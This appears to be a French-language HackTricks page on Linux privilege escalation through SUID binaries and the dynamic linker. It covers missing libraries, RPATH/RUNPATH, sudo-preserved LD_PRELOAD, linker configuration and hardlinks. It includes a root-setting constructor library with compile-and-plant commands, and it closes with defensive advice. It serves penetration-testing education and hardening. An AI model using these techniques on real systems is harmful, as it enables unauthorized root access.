# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

Les binaries SUID sont généralement examinés pour détecter une exécution directe de commandes, mais les programmes SUID personnalisés peuvent également être vulnérables via le linker dynamique. Le principe commun est simple : un executable privilégié charge du code depuis un chemin ou une configuration qu’un utilisateur moins privilégié peut contrôler.

Cette page se concentre sur des patterns de techniques génériques : libraries manquantes, répertoires de libraries inscriptibles, `RPATH`/`RUNPATH`, `LD_PRELOAD` via sudo, configuration du linker et confusion liée aux hardlinks SUID.

## Fast Enumeration

Commencez par rechercher les fichiers SUID inhabituels et vérifier s’ils sont liés dynamiquement :
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concentrez-vous sur les emplacements non standard, les chemins d’applications personnalisés, les binaires appartenant à root mais situés en dehors des répertoires gérés par les paquets, ainsi que les dépendances chargées depuis des répertoires accessibles en écriture.

Vérifications utiles des permissions d’écriture :
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Certains binaires SUID personnalisés tentent de charger un shared object qui n’existe pas. Si le chemin manquant se trouve sous un répertoire contrôlé par l’attaquant, le binaire peut charger du code fourni par l’attaquant avec l’utilisateur effectif.

Recherchez les recherches de bibliothèques ayant échoué :
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Si le binaire recherche `libexample.so` dans un chemin accessible en écriture, une bibliothèque de preuve minimale peut utiliser un constructeur. Gardez la preuve d’impact inoffensive pendant la validation :
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compilez-le avec le nom de fichier exact que le binaire tente de charger :
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condition exploitable ne réside pas uniquement dans l’absence de la bibliothèque. L’attaquant doit pouvoir placer un shared object compatible à un emplacement que le loader privilégié acceptera.

## Répertoire de bibliothèques accessible en écriture

Parfois, toutes les dépendances existent, mais l’un des répertoires utilisés pour les résoudre est accessible en écriture. Cela peut permettre de remplacer une bibliothèque chargée ou de placer une bibliothèque prioritaire portant le même nom.

Examinez les chemins des dépendances :
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Si le répertoire est accessible en écriture, validez-le avec une approche sûre utilisant une copie dans un lab. Remplacer des bibliothèques système sur un hôte actif peut interrompre l’authentification, la gestion des packages ou les services critiques au démarrage.

## RPATH and RUNPATH

`RPATH` et `RUNPATH` sont des entrées de la section dynamique qui indiquent au loader où rechercher les bibliothèques. Elles sont dangereuses dans les programmes SUID lorsqu’elles pointent vers des répertoires accessibles en écriture par un attaquant.

Détectez-les :
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Exemple de sortie à risque :
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Si `/opt/app/lib` est accessible en écriture et que le binaire a besoin de `libcustom.so`, l'attaquant peut être en mesure d'y placer une `libcustom.so` malveillante :
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` et `RUNPATH` ne sont pas identiques dans tous les détails de résolution, mais pour l’analyse d’une privilege-escalation, la question pratique reste la même : le binaire SUID recherche-t-il un répertoire contrôlable par l’attaquant pour trouver le nom d’une library ?

## LD_PRELOAD, LD_LIBRARY_PATH et SUID

Pour les programmes normaux, `LD_PRELOAD` et `LD_LIBRARY_PATH` peuvent forcer ou influencer le chargement des shared objects. Pour les programmes SUID, le dynamic loader passe normalement en secure-execution mode et ignore les variables d’environnement dangereuses.

Cela signifie qu’un simple binaire SUID n’est généralement pas vulnérable simplement parce que l’utilisateur peut définir `LD_PRELOAD` :
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
L’exception courante concerne une mauvaise configuration de sudo. Si `sudo -l` indique qu’une variable telle que `LD_PRELOAD` ou `LD_LIBRARY_PATH` est conservée, une commande autorisée par sudo peut charger du code contrôlé par l’attaquant :
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Ne confondez pas ces cas :

- `LD_PRELOAD` avec un binaire SUID normal : généralement bloqué par l’exécution sécurisée.
- `LD_PRELOAD` préservé par sudo : potentiellement exploitable.
- `.so` manquant dans un chemin accessible en écriture : exploitable lorsque le binaire SUID charge naturellement ce chemin.
- `RPATH`/`RUNPATH` vers un répertoire accessible en écriture : exploitable lorsqu’une bibliothèque nécessaire peut être contrôlée.
- Accès en écriture à `/etc/ld.so.preload` ou à la configuration du linker : impact global sur le système et élevé.

## Configuration du linker

Le linker dynamique lit également la configuration système, notamment `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, le cache du linker et, dans certains cas, `/etc/ld.so.preload`.

Vérifications à forte valeur :
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Une configuration du linker accessible en écriture est généralement plus grave qu’un seul binaire SUID vulnérable, car elle peut affecter de nombreux processus liés dynamiquement. `/etc/ld.so.preload` est particulièrement dangereux, car il peut forcer le chargement d’un objet partagé dans des processus privilégiés.

## SUID Hardlink Confusion

Les hardlinks peuvent faire apparaître le même inode SUID sous plusieurs noms. Cela permet de dissimuler un helper privilégié, de perturber le nettoyage ou de contourner une vérification naïve basée sur les chemins.

Recherchez les fichiers SUID ayant plusieurs liens :
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspectez tous les chemins vers le même inode :
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
L’abus ne réside pas dans le fait qu’un hardlink modifie les permissions. Il s’agit d’une confusion de chemin : un inode privilégié peut être accessible via un nom que les défenseurs ou les scripts ne s’attendent pas à trouver. Pour un aperçu plus approfondi du workflow des inodes et des hardlinks, consultez [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Notes défensives

- Gardez les binaires SUID minimaux, audités et gérés par les paquets lorsque cela est possible.
- Évitez les entrées `RPATH`/`RUNPATH` pointant vers des répertoires accessibles en écriture ou gérés par des applications.
- Gardez les répertoires de bibliothèques appartenant à root et non accessibles en écriture par les utilisateurs standard.
- Ne préservez pas `LD_PRELOAD`, `LD_LIBRARY_PATH` ou les variables similaires du loader via sudo.
- Surveillez `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` et les fichiers SUID inattendus.
- Vérifiez les fichiers SUID liés par hardlink et examinez les wrappers SUID personnalisés situés en dehors des chemins système standard.
{{#include ../../banners/hacktricks-training.md}}
